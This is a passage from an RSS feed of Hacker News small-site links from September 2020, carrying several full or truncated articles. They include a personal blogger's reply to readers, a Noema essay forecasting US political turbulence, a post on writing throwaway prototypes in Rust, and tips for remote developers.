<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://codingnest.com/the-little-things-speeding-up-c-compilation/">https://codingnest.com/the-little-things-speeding-up-c-compilation/</a></em></p>]]>
            </description>
            <link>https://codingnest.com/the-little-things-speeding-up-c-compilation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24537231</guid>
            <pubDate>Sun, 20 Sep 2020 20:41:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why aren’t you more serious?]]>
            </title>
            <description>
<![CDATA[
Score 114 | Comments 70 (<a href="https://news.ycombinator.com/item?id=24537147">thread link</a>) | @luu
<br/>
September 20, 2020 | https://rubenerd.com/why-arent-you-more-serious/ | <a href="https://web.archive.org/web/*/https://rubenerd.com/why-arent-you-more-serious/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div property="articleBody">
<p>I get more hits to my site and RSS feed in a typical month now than I used to get in a given year. For a fifteen year old blog that started life as a Perl CGI script in high school, it’s been wild to see. Whether you’re coming here from Hacker News, Reddit, Twitter, Discord, newsgroups, or the BSD Now podcast, hi! Sometimes I talk about tech here.</p>
<p>This marked increase in traffic corresponds with more feedback email, a not altogether insignificant number of which are negative. I’ll address some recurring themes here, because they’re Jason Bourne of the same misunderstanding of the kind of site people have come across.</p>
<p>Once you filter out the obvious trolls saying BSD is dead, Apple computers are for posers who value form over function, and that we’re all sheep for wearing a mask, most of the remainder concern the tone of my posts, and what they consider the ancillary topics I cover. They claim that my writing is too jovial, my site <a href="https://rubenerd.com/about/#mascot">mascot</a> drawn by Clara is inappropriate, and inclusion of posts about <a href="https://rubenerd.com/josh-on-how-to-peel-garlic/" title="Josh on how to peel garlic">cooking garlic</a> are a waste of time and somehow detract from my serious technical and political posts.</p>
<p><em>(One gentleman spent an inordinate amount of time criticising Rubi’s skirt in such lurid detail I felt but the tiniest twinge of what women must feel as creepy men ogle them walking past).</em></p>
<p>I appreciate—most of—the feedback, but respectfully disagree. There may not be many of us doing this anymore, but this is specifically a personal blog. This site has always been a labour of love for me since I started it in high school in 2004, and will necessarily be about stuff that’s on my mind and that I’m interested in. There are drier technical blogs by people I respect out there, but that’s not my style.</p>
<p>I’m also unsure how one can quantify detraction in this context. I remember having a similar debate with a WikiProject Albums contributor, who claimed compilation album articles similarly detracted from the quality of Wikipedia. In a finite space like a newspaper or book that might make sense, but in an electronic medium it seems to me the easiest solution is to ignore things in which you have no interest. Your also free to find an anime mascot drawn by my girlfriend offensive, just as I’m free to include her to make the world a slightly nicer place.</p>
<p>Which dovetails to the third comment which I take more seriously. I haven’t received permission to quote their email, but in summary they said my serious posts about COVID, social security, and attitudes in open source software communities are valuable, but sporadic. The implication is it’s incumbent upon me to only discuss important topics, and that by including what amounts to sidebars I’m trivialising them.</p>
<p>This one, selfishly, comes down to self-preservation. I need to write about the intricacies of BSD text editors and fun engineering or cooking videos to afford me sufficient mental fortitude to discuss serious topics. Sometimes we all need a break, and this is how I do it.</p>
<p>As I wrote on my <a href="https://rubenerd.com/the-first-post/">first post</a> fifteen years ago:</p>
<blockquote>
<p>… it’s a blog site with random stuff on it that I think is groovy, weird etc … maybe one percent of it, or maybe two, might be useful to someone, especially with respect to some of the tech problems I’ve had and solved over the years. So here it is.</p>
</blockquote>
<p>Thanks for reading.</p>
</div></div>]]>
            </description>
            <link>https://rubenerd.com/why-arent-you-more-serious/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24537147</guid>
            <pubDate>Sun, 20 Sep 2020 20:30:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Deploy any-size Keras model with a drag and drop]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24537099">thread link</a>) | @theo31
<br/>
September 20, 2020 | https://inferrd.com/deploy-keras | <a href="https://web.archive.org/web/*/https://inferrd.com/deploy-keras">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://inferrd.com/deploy-keras</link>
            <guid isPermaLink="false">hacker-news-small-sites-24537099</guid>
            <pubDate>Sun, 20 Sep 2020 20:25:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Welcome to the Turbulent Twenties]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24536933">thread link</a>) | @dforrestwilson
<br/>
September 20, 2020 | https://www.noemamag.com/welcome-to-the-turbulent-twenties/ | <a href="https://web.archive.org/web/*/https://www.noemamag.com/welcome-to-the-turbulent-twenties/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

				


<p>Almost three decades ago, one of us, Jack Goldstone, published a <a href="https://www.amazon.com/Revolution-Rebellion-Early-Modern-World/dp/1138222127/ref=pd_lpo_14_img_0/140-4438334-0411838?_encoding=UTF8&amp;pd_rd_i=1138222127&amp;pd_rd_r=48abcf2c-170c-43f1-ac2b-6aceb88ec983&amp;pd_rd_w=ROnfs&amp;pd_rd_wg=qroCO&amp;pf_rd_p=7b36d496-f366-">simple model</a> to determine a country’s vulnerability to political crisis. The model was based on how population changes shifted state, elite and popular behavior. Goldstone argued that, according to this Demographic-Structural Theory, in the 21st century, America was likely to get a populist, America-first leader who would sow a whirlwind of conflict.</p>



<p>Then ten years ago, the other of us, Peter Turchin, <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0237458">applied</a> Goldstone’s model to U.S. history, using current data. What emerged was alarming: The U.S. was heading toward the highest level of vulnerability to political crisis seen in this country in over a hundred years. Even before Trump was elected, Turchin <a href="https://www.nature.com/articles/463608a">published</a> his prediction that the U.S. was headed for the “Turbulent Twenties,” forecasting a period of growing instability in the United States and western Europe.</p>



<p>Given the Black Lives Matter protests and cascading clashes between competing armed factions in cities across the United States, from Portland, Oregon to Kenosha, Wisconsin, we are already well on our way there. But worse likely lies ahead.</p>



<p>Our model is based on the fact that across history, what creates the risk of political instability is the behavior of elites, who all too often react to long-term increases in population by committing three cardinal sins. First, faced with a surge of labor that dampens growth in wages and productivity, elites<strong> </strong><em>seek to take a larger portion of economic gains for themselves</em>, driving up inequality. Second, facing greater competition for elite wealth and status, <em>they tighten up the path to mobility to favor themselves and their progeny</em>. For example, in an increasingly meritocratic society, elites could keep places at top universities limited and raise the entry requirements and costs in ways that favor the children of those who had already succeeded. </p>



<p>Third, anxious to hold on to their rising fortunes, they <em>do all they can to resist taxation of their wealth and profits</em>, even if that means starving the government of needed revenues, leading to decaying infrastructure, declining public services and fast-rising government debts.</p>



<p>Such selfish elites lead the way to revolutions. They create simmering conditions of greater inequality and declining effectiveness of, and respect for, government. But their actions alone are not sufficient. Urbanization and greater education are needed to create concentrations of aware and organized groups in the populace who can mobilize and act for change.</p>


<!-- Quote Block Template -->

<div>

  <div>

    <p>
      “Such selfish elites lead the way to revolutions.”    </p>

    
    
  </div>
</div>




<p>Top leadership matters. Leaders who aim to be inclusive and solve national problems can manage conflicts and defer a crisis. However, leaders who seek to benefit from and fan political divisions bring the final crisis closer. Typically, tensions build between elites who back a leader seeking to preserve their privileges and reforming elites who seek to rally popular support for major changes to bring a more open and inclusive social order. Each side works to paint the other as a fatal threat to society, creating such deep polarization that little of value can be accomplished, and problems grow worse until a crisis comes along that explodes the fragile social order.</p>



<p>These were the conditions that prevailed in the lead-up to the great upheavals in political history, from the French Revolution in the eighteenth century, to the revolutions of 1848 and the U.S. Civil War in the nineteenth century, the Russian and Chinese revolutions of the twentieth century and the many “color revolutions” that opened the twenty-first century. So, it is eye-opening that the data show very similar conditions now building up in the United States.</p>



<p>In applying our model to the U.S., we tracked a number of indicators of popular well-being, inequality and political polarization, all the way from 1800 to the present. These included the ratio of median workers’ wages to GDP per capita, life expectancy, the number of new millionaires and their influence on politics, the degree of strict party-line voting in Congress, and the incidence of deadly riots, terrorism and political assassinations. We found that all of these indicators pointed to two broad cycles in U.S. history.</p>



<p>In the decades following independence, despite growing party competition, elites in office often compromised and voted together, and rising national prosperity was broadly shared. But that wave of positive conditions peaked around 1820; from there, political polarization and economic inequality rose sharply in the years leading up to the Civil War. The crisis indicators peaked in the 1860s but did not fall sharply after the war; instead, they remained high until 1920 (the years of Reconstruction, Jim Crow, Gilded Age and violent labor unrest, and the anarchists).</p>



<p>Then, the tide shifted, and a second wave of greater unity and prosperity began to gather strength. Contrary to expectations, World War I and the Great Depression did <em>not </em>produce a rise in political instability indicators. Instead, the country pulled together. The reforms introduced during the Progressive Era and clinched in the New Deal reduced inequality and strengthened the economic share of workers; during and after World War II, the country agreed on new tax policies and increased spending on roads and schools.</p>



<p>The 1950s were a golden age of worker progress and party cooperation; even in the 1960s and 1970s, despite serious racial conflicts, the country’s leaders were able to agree on remarkably far-reaching reforms to improve civil rights and environmental protection. However, the 1960s were a high point in our indicators of political resilience; in the 1970s and 1980s, things began to turn, and by the 1990s, a new wave of rising inequality and political divisions was well underway, exemplified by Newt Gingrich’s policies as speaker of the House. In the next two decades, the crisis indicators rose just as sharply as they had in the decades before the Civil War. It was not just that by the late 2010s, overall inequality was rising to the levels not seen since the Gilded Age; median wages in relation to GDP per capita also were falling to historically low levels.</p>



<p>Writing in the journal <a href="https://www.nature.com/articles/463608a">Nature in 2010</a>, we pointed out that such trends were a reliable indicator of looming political instability and that they “look set to peak in the years around 2020.” In <a href="https://www.amazon.com/Ages-Discord-Peter-Turchin/dp/0996139540/ref=pd_lpo_14_img_1/140-4438334-0411838?_encoding=UTF8&amp;pd_rd_i=0996139540&amp;pd_rd_r=e31aa110-1e97-41b5-b8b9-59732b68e1b1&amp;pd_rd_w=NKvjs&amp;pd_rd_wg=QoYuR&amp;pf_rd_p=7b36d496-f366-4631-94d3-61b87b52511b&amp;pf_rd_r=53CDBB3DFVBED71T3PKV&amp;psc=1&amp;refRID=53CDBB3DFVBED71T3PKV">Ages of Discord</a>, published early in 2016, we showed that America’s “political stress indicator” had turned up sharply in recent years and was on track to send us into the “Turbulent Twenties.”</p>


<!-- Content Image Block Template -->
<div>

  <div>

    <!-- Main Image -->
    <div>

            <div>
              <p><img width="1024" height="730" src="https://www.noemamag.com/wp-content/uploads/2020/09/Ages_of_Discord.png" alt="" srcset="https://www.noemamag.com/wp-content/uploads/2020/09/Ages_of_Discord.png 1024w, https://www.noemamag.com/wp-content/uploads/2020/09/Ages_of_Discord-300x214.png 300w, https://www.noemamag.com/wp-content/uploads/2020/09/Ages_of_Discord-768x548.png 768w, https://www.noemamag.com/wp-content/uploads/2020/09/Ages_of_Discord-540x385.png 540w, https://www.noemamag.com/wp-content/uploads/2020/09/Ages_of_Discord-701x500.png 701w, https://www.noemamag.com/wp-content/uploads/2020/09/Ages_of_Discord-898x640.png 898w, https://www.noemamag.com/wp-content/uploads/2020/09/Ages_of_Discord-600x428.png 600w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
      </div>

              <div>
              
      <figcaption>
        <p>The Political Stress Index (PSI) combines the three crisis indicators in the Goldstone-Turchin theory: declining living standards, increasing intra-elite competition/conflict and a weakening state. Growing PSI indicates increased likelihood of political violence. The Well-Being Index indicates greater equality, greater elite consensus and a more legitimate state.</p>
      </figcaption>

            </div>
      
    </div>


      </div>

</div>



<hr>



<p>This year, the COVID-19 pandemic and the death of George Floyd at the hands of the Minneapolis police have delivered a double-barreled crisis to U.S. politics. America has reacted with a nationwide, months-long series of urban protests. But this explosion of protest is not just the result of this year’s events. The U.S. has weathered epidemics and racial protests before and produced legislation that made the country better as a result. What is different this decade is that these events are occurring at a time of extreme political polarization, after decades of falling worker’s share in national income, and with entrenched elite opposition to increased spending on public services. These trends have crippled the U.S. government’s ability to mount an effective response to the pandemic, hampered our ability to deliver an inclusive economic relief policy and exacerbated the tensions over racial injustice that boiled over in response to the video of Floyd’s death.</p>



<p>Is the U.S. likely headed for still greater protests and violence? In a word, yes. Inequality and polarization have not been this high since the nineteenth century. Democrats are certain that if Donald Trump is re-elected, American democracy will not survive. Republicans are equally certain that if Trump loses, radical socialists will seize the wealth of elites and distribute it to underserving poor and minorities, forever destroying the economy of the United States. Both sides are also convinced that the other side intends to change the democratic “rules of the game” in ways that will make it impossible for them to compete effectively in future elections. In such conditions, elections are not merely contests over policy preferences; they become existential battles for the future of the nation. Whichever party loses is likely to view the results as rigged and the outcome as intolerable.</p>


<!-- Quote Block Template -->

<div>

  <div>

    <p>
      “Almost any election scenario this fall is likely to lead to popular protests on a scale we have not seen this century.”    </p>

    
    
  </div>
</div>




<p>The upcoming election therefore offers <a href="https://www.bostonglobe.com/2020/07/25/nation/bipartisan-group-secretly-gathered-game-out-contested-trump-biden-election-it-wasnt-pretty/">several outcomes</a> that could trigger mass violence. If Trump wins narrowly in the electoral college but loses the popular vote by a large margin, there will surely be massive demonstrations protesting the outcome, calling it illegitimate and demanding allegiance to the will of the majority of Americans. Trump may then be tempted to call in federal forces to put down these protests (as in Portland), which may in turn, as in Portland, provoke even larger uprisings.</p>



<p>If Trump loses, he is likely to contest the outcome as a “<a href="https://nymag.com/intelligencer/2020/05/trump-is-preparing-to-contest-any-election-loss.html">rigged</a>” election. But that action will again lead to massive popular protests, this time to insist that the election results be honored. If Trump again puts federal security forces in …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.noemamag.com/welcome-to-the-turbulent-twenties/">https://www.noemamag.com/welcome-to-the-turbulent-twenties/</a></em></p>]]>
            </description>
            <link>https://www.noemamag.com/welcome-to-the-turbulent-twenties/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24536933</guid>
            <pubDate>Sun, 20 Sep 2020 20:03:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Throw Away Code]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24536854">thread link</a>) | @yannikyeo
<br/>
September 20, 2020 | https://vorner.github.io/2020/09/20/throw-away-code.html | <a href="https://web.archive.org/web/*/https://vorner.github.io/2020/09/20/throw-away-code.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
      <section id="main_content">
        

<p>There’s an ongoing discussion about what makes Python better prototyping
language than Rust (with Python being probably just the archetype of some
scripted weakly-typed language). The thing is, I prefer doing my prototypes in
Rust over Python. Apparently, I’m not the only one. So I wanted to share few
things about what makes Rust viable for these kinds of throw-away coding
sprints, at least for me.</p>

<h2 id="our-goals">Our goals</h2>

<p>Sometimes, our goal isn’t really to write perfect code that is performant,
correct, handles all kinds of errors sanely, has great UX and is maintainable.
These projects are what we are proud of, sure. We pin them on github profiles.
We write blog posts about them. We write whole handbooks of best practices how
to do them.</p>

<p>But sometimes we just need to throw something together really fast and don’t
care about the quality as much. That kind of bit of cardboard and huge amount of
duck tape thing. These include:</p>

<ul>
  <li>Single-use debugging tools („I need to throw 10k of these weird requests at
the server to see if it triggers the bug. It didn’t? Ok, let’s try something
else…“)</li>
  <li>Searching for a counter-example to a claim in a scientific paper („I can prove
it’s a counter example once I have it, so I won’t need the code any more“)</li>
  <li>Processing bunch of data just once („I wonder how many of these <code>.txt</code> files
have broken unicode in them“)</li>
  <li>Figuring if something has any chance to fly at all, before committing to it
(„Could I distribute the changes as compressed binary diffs, or would that be
too large?“)</li>
  <li>Demonstration purposes („We would like to build something in lines of this,
but, you know, actually working“)</li>
</ul>

<p>Of course, there’s a lot more. I’m not even sure if there’s more of the „proper“
coding or of this „throw away“ coding. Except that we don’t really brag about
our throw-away code („Look what terrible monster I’ve stitched together during
the lunch break“), we don’t write tutorials how to write them much, etc. So this
is exactly the kind of blog post we don’t write 😈.</p>

<p>Instead of writing something proper this time, we are going to talk about
how to write terrible code, but fast. We have decided to make an explicitly
sloppy job of this one and admit it to ourselves not to feel ashamed of it
later:</p>

<ul>
  <li>We want to spend as little time on it as possible. Just do it, throw the code
away after it had its use and move on. This one is going to be over by lunch
time.</li>
  <li>We don’t care about performance that much (as long as it finishes running
before the lunch too).</li>
  <li>We don’t care about handling all corner cases, only the ones we actually
encounter in the data.</li>
  <li>We don’t care about documentation or readability.</li>
  <li>We don’t care about tests, provided we are confident enough the answers are
accurate enough.</li>
  <li>Actually, we don’t really care at all…</li>
</ul>

<p><em>Note: make sure not to let anyone put this into production 😇. If you don’t
delete it, make sure there’s a comment on a prominent place warning people not
to use it.</em></p>

<h2 id="why-do-people-think-python-fits-here-better-than-rust">Why do people think Python fits here better than Rust</h2>

<p>The thing is, Rust <em>makes us</em> care. That’s one of the points of Rust. It’ll
complain that our code is not production quality and that we need to do better
to save on the pain down the line. Its type system can be a real prick in
insisting on little details, like that ints and strings are not really the same
thing and that there’s a difference between owned and borrowed thing and… Well,
you know, all that stuff. Rust wants you to make good, proper, maintainable
code.</p>

<p>On the other hand, Python doesn’t really insist on anything. Therefore, it is
easier to not care in Python.</p>

<h2 id="my-own-experience">My own experience</h2>

<p>I know a bunch of programming languages and reach for the one that I hope would
suit me best in the given time. So, for some really simple things I simply put
together few lines of shell (and some slightly less simple ones ‒ I’m ashamed to
admit that some 1000 lines long shell monster kept running in real production
for years ‒ but it <em>did run</em>). If it can be done by 2 or 3 ugly pipelines, it’s
fine.</p>

<p>Over the years, I’ve used Perl a lot (that one doesn’t care if it’s int or
string… no, correction, in Perl everything is a string, ints just don’t exist.
Well, kind of). It’s probably <em>the</em> language designed for throw away coding.
I’ve done some Python too (that’s like Perl, but with proper objects in it, and
everything is a dictionary there).</p>

<p>But recently I’ve noticed that if I try to do a similar thing, I do it faster in
Rust. Not that it runs faster (well, that usually too, but that’s not the
point), but that I’m done with the task at hand sooner and with slightly smaller
amount of cursing.</p>

<p>This certainly is in part because I’m more proficient in Rust than in Python.
It’s also because the Rust mental model is closer to how my brain works than the
Python one. <strong>Your mileage will vary</strong> ‒ if you’re a Python matador who’s been
coding in it for decades and are just learning Rust, you’ll certainly do it
faster in Python.</p>

<p>But also, there are some tricks you might employ to do these things in Rust
faster (that is, faster than you do now, not necessarily faster than in
<code>$OTHER_LANGUAGE</code>).</p>

<h2 id="tricks-for-faster-coding">Tricks for faster coding</h2>

<h3 id="compile-times">Compile times</h3>

<p>Rust is known for its slow compile times. Python has <em>no</em> compile times. If you
have to wait every time for the compilation just to have a bunch of errors
thrown into your face, it’s going to slow you down. Especially because Rust
<em>likes to</em> throw bunch of errors at you every time you try to compile it. Rust
is known for its great error messages, so it wants to brag how good they are by
using them <em>a lot</em>.</p>

<p>You can, however, notice that you don’t really need to <em>build and run</em> every
time. That you often just want to check everything is on the right path. For
Python, you do need to actually run the thing (because Python doesn’t really
have much of a compile time so it likes to throw the bunch of errors into your
face at <em>run time</em>), but Rust is the language that „if
it compiles, it’s correct“. And by complies, I actually mean mostly type-checks.</p>

<p>What does this all mean? You can check out:</p>

<ul>
  <li>The <code>rust-analyzer</code> language server. You’ll be getting red squiggles in the
editor instead of having to compile. It’s not perfect (sometimes the list of
errors is different, sometimes it just gives up on that particular project),
but it’s getting better and it points out most of the errors without any
compilation at all.</li>
  <li><code>cargo check</code> performs just the first stages of compilation and will stop
before codegen. It means it doesn’t produce anything that could be run, but
it is so much faster and provides the bunch of errors we so much want to have.</li>
  <li>You can let <code>cargo watch</code> keep recompiling the code asynchronously in another
terminal. I just glance at it to check if there are any errors around, but I
don’t wait for it ‒ at worst, the list of errors is one iteration outdated. It
can be used for other things, like keeping the documentation of the current
crate up to date, or having a head start at compiling the executable, or even
having all the tests being re-run on each save (I’m getting off topic here; we
are being sloppy here on purpose, so what tests are we talking about?)</li>
</ul>

<p>These don’t make the compile times shorter, but it eliminates the <em>waiting</em> for
them from the hot coding path. It still takes some time to compile (especially
if you have a lot of dependencies and do a clean release build), but that
doesn’t mean it has to slow you down.</p>

<h3 id="embrace-the-type-system-and-borrow-checker-and-all-of-these-things">Embrace the type system (and borrow checker and all of these things)</h3>

<p>After some time working with Rust, one learns to lean onto them instead of
fighting them.</p>

<p>This is where most of my own speed up comes from and what I miss about Python.
When I want to know if my code is working, I actually have to run the Python
thing and feed it with data. Which means I either need to set up a smaller input
or wait for the whole thing to get crunched, only to have it explode on some
typo or switched order of parameters after 5 minutes of running. After 10
iterations of running the Python code (each crashing later and later in the
code), it finally finishes. By that time, I’m no longer confident it does what
it should, after all these retries, so I go back and have to figure a way to
double-check it.</p>

<p>In Rust not only I don’t have to run the code until it is almost finished and
even when I feed it the whole input (which I usually do), it’s usually faster
and it runs to completion the first time. I also can move through the code much
faster. With Python, I stop to check the documentation, think about what type
goes where, etc, exactly because it’s so painful to find out only at runtime. I
need to be careful while writing the code.
With Rust, I just type the code, get the red squiggly, fix it and move on. I
outsource that effort of checking if these things click together in any
meaningful way to the compiler.</p>

<p>This is kind of in the theme of „hurry slowly“ approach. By making sure
everything has the right types and aligns well, it makes each iteration slower.
But it also makes it possible to have much fewer iterations before the whole
thing works well enough.</p>

<p>Also, don’t fall for the impression that throwing <code>unsafe</code> in there to bypass
some of the checking will save you time. It won’t. It’s a trap. If you don’t
know for sure that you need it, then you probably don’t and doing <code>unsafe</code> right
is a lot of work. Doing it wrong is easy, maybe easier than doing it safely, but
you’ll pay for it later on, when trying to figure out why the thing does
something arcanely weird. If you put any non-trivial <code>unsafe</code> in the code,
you’re risking spending days and nights in front of a debugger. The checks are
there for a reason.</p>

<h3 id="take-the-easy-way-out">Take the easy way out</h3>

<p>I don’t say to clone everything. Even in prototyping code, I often take <code>&amp;str</code>
as parameter if it’s just „looking at it“. But I do so in the obvious, trivial
cases. The ones I don’t really need to think about any more.</p>

<p>But if you ever find yourself thinking about writing any kind of
<code>-&gt; impl Iterator&lt;Item = &amp;impl Display&gt; + '_</code>, just stop and throw a
<code>Vec&lt;String…</code></p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vorner.github.io/2020/09/20/throw-away-code.html">https://vorner.github.io/2020/09/20/throw-away-code.html</a></em></p>]]>
            </description>
            <link>https://vorner.github.io/2020/09/20/throw-away-code.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24536854</guid>
            <pubDate>Sun, 20 Sep 2020 19:54:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Secrets I use to becoming a better remote developer]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24536775">thread link</a>) | @mateusfreira
<br/>
September 20, 2020 | https://mateusfreira.github.io/@mateusfreira-secrets-to-becoming-a-better-remote-developer/ | <a href="https://web.archive.org/web/*/https://mateusfreira.github.io/@mateusfreira-secrets-to-becoming-a-better-remote-developer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I have been working as a remote developer fulltime, for the last five years. Part-time/freelancing for at least ten years, over this time, I have collected several tips and tricks on how to become better at it and how to succeed and deliver results under this environment. I am writing this post to share some of these tricks, while this is a brief list. I am always testing these things. I thought it would be useful to do this one and periodically create a new one to share some updates.</p>

<p>If you are a TLDR reader, I am sharing here the list of the subtitles:</p>

<ul id="markdown-toc">
  <li><a href="#secrets" id="markdown-toc-secrets">Secrets</a>    <ul>
      <li><a href="#be-positive-and-open-minded" id="markdown-toc-be-positive-and-open-minded">Be Positive and Open-minded</a></li>
      <li><a href="#create-a-clean-setup-and-neat-workspace" id="markdown-toc-create-a-clean-setup-and-neat-workspace">Create a clean setup and neat workspace</a></li>
      <li><a href="#create-a-before-commit-secret-message" id="markdown-toc-create-a-before-commit-secret-message">Create a “before commit” secret message</a></li>
      <li><a href="#create-a-pull-request-checklist" id="markdown-toc-create-a-pull-request-checklist">Create a Pull request checklist</a></li>
      <li><a href="#address-daily-meetings-like-a-diary" id="markdown-toc-address-daily-meetings-like-a-diary">Address daily meetings like a diary</a></li>
      <li><a href="#tools-you-should-use" id="markdown-toc-tools-you-should-use">Tools you should use</a>        <ul>
          <li><a href="#1-grammarly" id="markdown-toc-1-grammarly">1. Grammarly</a></li>
          <li><a href="#2-time-tracker" id="markdown-toc-2-time-tracker">2. Time tracker</a></li>
          <li><a href="#3-skitch" id="markdown-toc-3-skitch">3. Skitch</a></li>
          <li><a href="#4-obs-screen-recording" id="markdown-toc-4-obs-screen-recording">4. OBS (screen recording)</a></li>
        </ul>
      </li>
      <li><a href="#take-notes-notes-and-notes" id="markdown-toc-take-notes-notes-and-notes">Take Notes, notes, and notes</a></li>
      <li><a href="#work-in-the-morning" id="markdown-toc-work-in-the-morning">Work in the morning</a></li>
      <li><a href="#create-a-routine" id="markdown-toc-create-a-routine">Create a routine</a>        <ul>
          <li><a href="#1-wake-up-early" id="markdown-toc-1-wake-up-early">1. Wake up early</a></li>
          <li><a href="#2-prepare-coffee" id="markdown-toc-2-prepare-coffee">2. Prepare coffee</a></li>
          <li><a href="#3-workout-3-times-a-week" id="markdown-toc-3-workout-3-times-a-week">3. Workout 3 times a week</a></li>
          <li><a href="#4-read" id="markdown-toc-4-read">4. Read</a></li>
          <li><a href="#5-write" id="markdown-toc-5-write">5. Write</a></li>
          <li><a href="#6-sleep-regularly" id="markdown-toc-6-sleep-regularly">6. Sleep regularly</a></li>
        </ul>
      </li>
      <li><a href="#use-vim-and-tmux-or-at-least-master-your-env-and-editor" id="markdown-toc-use-vim-and-tmux-or-at-least-master-your-env-and-editor">Use Vim and Tmux (or at least master your Env and editor)</a></li>
      <li><a href="#create-a-dotproject" id="markdown-toc-create-a-dotproject">Create a Dotproject</a></li>
      <li><a href="#read-these-books" id="markdown-toc-read-these-books">Read these books</a>        <ul>
          <li><a href="#1-the-culture-map" id="markdown-toc-1-the-culture-map">1. The Culture map</a></li>
          <li><a href="#2-the-pragmatic-programmer" id="markdown-toc-2-the-pragmatic-programmer">2. The Pragmatic Programmer</a></li>
          <li><a href="#3-getting-thins-done" id="markdown-toc-3-getting-thins-done">3. Getting Thins done</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
  <li><a href="#reviewers" id="markdown-toc-reviewers">Reviewers</a></li>
</ul>

<p>Now, if you find something interesting, stay with me and let’s learn something.</p>

<h2 id="secrets">Secrets</h2>

<p>From the easiest to the hardest.</p>

<h3 id="be-positive-and-open-minded">Be Positive and Open-minded</h3>

<p>This may be cliche, and not everyone is a positive person (and does not need to be). Still, is cool to have a positive attitude upfront a challenge or request; I am not saying you should be a yes man, I am saying that when you get a request, try to think about it as if is a challenge rather than a boring request,  or someone wanting to steal some of your time.</p>

<p>Be energetic and show what happens when you overcome some hard challenges, push the time to be more positive (for example). Being positive and expressing the success will increase yours and your team morale, and high team morale increases the chance of success.</p>

<h3 id="create-a-clean-setup-and-neat-workspace">Create a clean setup and neat workspace</h3>

<p>My workspace has a significant impact on my state of mind and even my productivity; back when I started working remotely, my office was a mess. I had a lot of objects on my table, and lots of them I had never used or even touched. That all ended-up on a day that I got a massive allergy that lasted for over two weeks. I noticed that was because of the dust in my office. It was out of control, and it would have been easier to clean it up weren’t for all the objects I had on my table.</p>

<p><img src="https://user-images.githubusercontent.com/234049/92327865-0b314c80-f033-11ea-9727-baa8721d65a7.png" alt="Old office"></p>

<p>At that time, I also noticed I would work anywhere but in the office. After that day, I cleaned my office and removed everything from my table. In one week, I noticed a productivity-boosting and a much better sense of peace while working in my office. Then I started reading about all of that “clean-setup” movement, which immediately made sense. So I started the journey on how I could de more productive without working more hours, and I decided to go all-in. I stopped buying electronics that I rarely used and instead, I used the money to make my office simpler, cleaner, and more set to productivity.
I bought two ergonomic chairs, started using a single and bigger monitor instead of two. I got a mechanical arm that suspends it and therefore I do not occupy my table with supports. I switched my wired mouse and keyboard for wireless, added a plant, and even a fancy lamp to my office table.</p>

<p>Here is how it looks now.</p>

<p><img src="https://user-images.githubusercontent.com/234049/93273814-36ccd900-f78f-11ea-844e-bad54f0d8dab.png" alt="New office"></p>

<p>Since these changes, I’ve noticed an even more significant increase in my productivity and well-being while working. I am still working out of the office sometimes, like from the garden of my house, from coffee shops or libraries, but now I feel there is no more productive place than my office in the quiet hours of the day. And I have tested myself to see how to return to the old mess environment. I placed a single page of paper on my table next to my keyboard, and at the end of that day, I felt exhausted. That day didn’t feel productive at all. It amazes me how much impact can a little mess do to my well-being nowadays, and how could I possibly work on such a chaotic environment in a close past.</p>

<p><img src="https://user-images.githubusercontent.com/234049/92327958-bcd07d80-f033-11ea-86d5-4c8205b63a1f.jpg" alt="Garden"></p>

<h3 id="create-a-before-commit-secret-message">Create a “before commit” secret message</h3>

<p>Before doing any commit, my secret is that I will have my editor asking me, <code>Is it easy to change?</code>. This advice comes from several coding or software design books. The most important factory of a useful feature, project, software, method, and commit is that it needs to be changed easily. The idea for that message came from the book <a href="https://amzn.to/2AVGWiZ">Pragmatic programmer</a> (This is an outstanding book I recommend for any programmer at any level). As soon as I read it, I knew it would be a good idea to ask my self that question from time to time, once every commit seems to be the best I have for the moment.</p>

<p><img src="https://mateusfreira.github.io/images/commit-message.png" alt="Secret commit question"></p>

<h3 id="create-a-pull-request-checklist">Create a Pull request checklist</h3>

<p>In my daily notes, I have one checklist for each PR I will open for any project. This will help me making sure that PR will be good and will pass easily on review. I am also giving a grammar checking on Grammarly (I will talk about it in detail later in the Grammarly chapter). Check the variable names I have added in (You know how hard naming is), check the docs of the methods (So I make sure I’ve documented any critical information), check API docs (Changes in public APIs are usually rare, but when they happen you better remember to also update their docs). Smoke testing (of course, running the tests locally and seeing how they go). And finally, improve something I see that is bad (I try as much as I can not to rush on PR opening and to have this last step to improve something work for me like and “It won’t be possible to rush at this point”. The thing is, I usually find other small problem on the code in this step and consider it to be one of the most important)</p>

<div><div><pre><code><span># PR self review check list</span>
- <span>[</span> <span>]</span> Pass grammarly <span>in </span>the PR body
